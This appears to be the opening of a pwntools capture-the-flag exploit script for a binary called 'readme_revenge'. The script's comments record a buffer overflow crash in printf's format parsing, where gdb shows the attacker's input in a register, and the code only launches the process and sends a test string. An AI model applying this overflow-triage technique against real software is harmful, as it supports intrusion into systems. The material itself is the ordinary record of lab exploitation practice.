# -*- coding: utf-8 -*-

import sys
from pwn import *

"""
$ python -c 'print "A"*3000' | ./readme_revenge
$ gdb ./readme_revenge ./core
$ 
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000000000045ad64 in __parse_one_specmb ()

gef➤  bt
#0  0x000000000045ad64 in __parse_one_specmb ()
#1  0x0000000000443153 in printf_positional ()
#2  0x0000000000446ed2 in vfprintf ()
#3  0x0000000000407a74 in printf ()
#4  0x0000000000400a56 in main ()

gef➤  print $rip
$1 = (void (*)()) 0x45ad64 <__parse_one_specmb+1300>

gef➤  disass $rip
Dump of assembler code for function __parse_one_specmb:
... 
   0x000000000045ad53 <+1283>:  jmp    0x45ab95 <__parse_one_specmb+837>
   0x000000000045ad58 <+1288>:  nop    DWORD PTR [rax+rax*1+0x0]
   0x000000000045ad60 <+1296>:  movzx  edx,BYTE PTR [r10]
=> 0x000000000045ad64 <+1300>:  cmp    QWORD PTR [rax+rdx*8],0x0
   0x000000000045ad69 <+1305>:  je     0x45a944 <__parse_one_specmb+244>
   0x000000000045ad6f <+1311>:  lea    rdi,[rsp+0x8]
   0x000000000045ad74 <+1316>:  mov    rsi,rbx
... 

gef➤  print $rax
$2 = 0x4141414141414141

gef➤  print $rdx
$3 = 0x73
"""

r = process('./readme_revenge')

r.send('babo\n')

print (r.recv())
